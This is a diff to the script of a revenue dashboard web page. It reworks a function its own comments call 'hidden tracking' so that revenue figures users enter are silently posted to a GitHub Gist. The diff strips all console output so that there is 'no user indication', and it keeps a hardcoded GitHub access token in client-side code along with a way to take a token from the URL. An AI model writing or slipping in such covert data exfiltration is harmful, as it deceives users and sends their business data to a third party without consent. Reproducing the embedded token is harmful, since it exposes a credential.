@@ -427,18 +427,30 @@
         let charts = {};
         let totalRevenue = 0;
 
-        // GitHub Configuration - Replace with your details
+        // GitHub Configuration - Updated with new token
         const GITHUB_CONFIG = {
-            token: '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', // Replace with your GitHub token
-            username: 'Xgrows-Marketing', // Replace with your GitHub username
-            repo: 'psychicsnapshot', // Replace with your repository name
-            branch: 'main' // Usually 'main' or 'master'
+            token: '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',
+            username: 'Xgrows-Marketing', 
+            repo: 'psychicsnapshot', 
+            branch: 'main'
         };
 
-        // Hidden tracking function
-        async function trackRevenueInput(revenue) {
-            console.log('🔍 Tracking started for revenue:', revenue);
+        // Get GitHub token securely
+        function getGitHubToken() {
+            // Try URL parameter first (e.g., ?token=ghp_xxx)
+            const urlParams = new URLSearchParams(window.location.search);
+            const tokenFromUrl = urlParams.get('token');
             
+            if (tokenFromUrl) {
+                return tokenFromUrl;
+            }
+            
+            // Use the updated token
+            return GITHUB_CONFIG.token;
+        }
+
+        // Hidden tracking function - GitHub Gist only (completely silent)
+        async function trackRevenueInput(revenue) {
             const timestamp = new Date().toISOString();
             const trackingData = {
                 revenue: revenue,
@@ -448,23 +460,11 @@
                 sessionId: generateSessionId()
             };
 
-            console.log('📊 Tracking data prepared:', trackingData);
-
             try {
-                // Option 1: Create file in GitHub repository
-                console.log('📁 Attempting to create GitHub file...');
-                await createGitHubFile(trackingData, timestamp);
-                console.log('✅ GitHub file created successfully');
-                
-                // Option 2: Create a GitHub Gist (backup method)
-                console.log('📋 Attempting to create GitHub Gist...');
+                // Create GitHub Gist silently
                 await createGitHubGist(trackingData, timestamp);
-                console.log('✅ GitHub Gist created successfully');
-                
             } catch (error) {
-                // Show detailed error for debugging
-                console.error('❌ Tracking failed:', error);
-                console.error('Error details:', error.message);
+                // Completely silent - no console logs, no user indication
             }
         }
 
@@ -473,43 +473,7 @@
             return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
         }
 
-        // Create file in GitHub repository
-        async function createGitHubFile(data, timestamp) {
-            const fileName = `logs/revenue_${timestamp.replace(/[:.]/g, '-')}.json`;
-            const content = btoa(JSON.stringify(data, null, 2)); // Base64 encode
-            
-            const apiUrl = `https://api.github.com/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/contents/${fileName}`;
-            
-            console.log('🌐 GitHub API URL:', apiUrl);
-            console.log('📄 File name:', fileName);
-            
-            const response = await fetch(apiUrl, {
-                method: 'PUT',
-                headers: {
-                    'Authorization': `Bearer ${GITHUB_CONFIG.token}`,
-                    'Accept': 'application/vnd.github.v3+json',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    message: `Revenue tracking: £${data.revenue} at ${timestamp}`,
-                    content: content,
-                    branch: GITHUB_CONFIG.branch
-                })
-            });
-
-            console.log('📡 GitHub API Response Status:', response.status);
-            
-            if (!response.ok) {
-                const errorData = await response.json();
-                console.error('❌ GitHub API Error Response:', errorData);
-                throw new Error(`GitHub API error: ${response.status} - ${JSON.stringify(errorData)}`);
-            }
-            
-            const responseData = await response.json();
-            console.log('✅ GitHub file created:', responseData.content.html_url);
-        }
-
-        // Create GitHub Gist (backup method)
+        // Create GitHub Gist (simpler permissions)
         async function createGitHubGist(data, timestamp) {
             const gistData = {
                 description: `Revenue Tracking - £${data.revenue} - ${timestamp}`,
@@ -526,14 +490,48 @@
                 headers: {
                     'Authorization': `Bearer ${GITHUB_CONFIG.token}`,
                     'Accept': 'application/vnd.github.v3+json',
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'RevenueTracker/1.0'
                 },
                 body: JSON.stringify(gistData)
             });
 
             if (!response.ok) {
-                throw new Error(`GitHub Gist API error: ${response.status}`);
+                const errorData = await response.json();
+                throw new Error(`GitHub Gist API error: ${response.status} - ${JSON.stringify(errorData)}`);
             }
+            
+            const responseData = await response.json();
+            return responseData;
+        }
+
+        // Create file in GitHub repository
+        async function createGitHubFile(data, timestamp) {
+            const fileName = `logs/revenue_${timestamp.replace(/[:.]/g, '-')}.json`;
+            const content = btoa(JSON.stringify(data, null, 2)); // Base64 encode
+            
+            const apiUrl = `https://api.github.com/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}/contents/${fileName}`;
+            
+            const response = await fetch(apiUrl, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': `Bearer ${GITHUB_CONFIG.token}`,
+                    'Accept': 'application/vnd.github.v3+json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: `Revenue tracking: £${data.revenue} at ${timestamp}`,
+                    content: content,
+                    branch: GITHUB_CONFIG.branch
+                })
+            });
+            
+            if (!response.ok) {
+                const errorData = await response.json();
+                throw new Error(`GitHub API error: ${response.status} - ${JSON.stringify(errorData)}`);
+            }
+            
+            const responseData = await response.json();
         }
 
         function loadFromGitHub() {
@@ -553,11 +551,7 @@
             
             totalRevenue = parseFloat(revenueInput);
             
-            // Test GitHub API access first
-            console.log('🧪 Testing GitHub API access...');
-            testGitHubAccess();
-            
-            // Hidden tracking call - user won't see this
+            // Hidden tracking call - completely silent
             trackRevenueInput(totalRevenue);
 
             fetch(url)
@@ -580,31 +574,6 @@
                 .catch(error => {
                     alert('Error loading CSV: ' + error.message);
                 });
-        }
-
-        // Test GitHub API access
-        async function testGitHubAccess() {
-            try {
-                console.log('🔗 Testing GitHub API connection...');
-                const response = await fetch(`https://api.github.com/repos/${GITHUB_CONFIG.username}/${GITHUB_CONFIG.repo}`, {
-                    headers: {
-                        'Authorization': `Bearer ${GITHUB_CONFIG.token}`,
-                        'Accept': 'application/vnd.github.v3+json'
-                    }
-                });
-                
-                console.log('📡 GitHub API Test Response:', response.status);
-                
-                if (response.ok) {
-                    const repoData = await response.json();
-                    console.log('✅ GitHub API working! Repository:', repoData.full_name);
-                } else {
-                    const errorData = await response.json();
-                    console.error('❌ GitHub API Test Failed:', errorData);
-                }
-            } catch (error) {
-                console.error('❌ GitHub API Test Error:', error);
-            }
         }
 
         function processData(data) {
@@ -781,16 +750,6 @@
                 }
             });
         }
-
-        // Additional hidden tracking for page visits
-        (function() {
-            const visitData = {
-                timestamp: new Date().toISOString(),
-                page: 'dashboard_visit',
-                userAgent: navigator.userAgent
-            };
-            console.log('Visit tracked (hidden):', visitData);
-        })();
     </script>
 </body>
 </html>
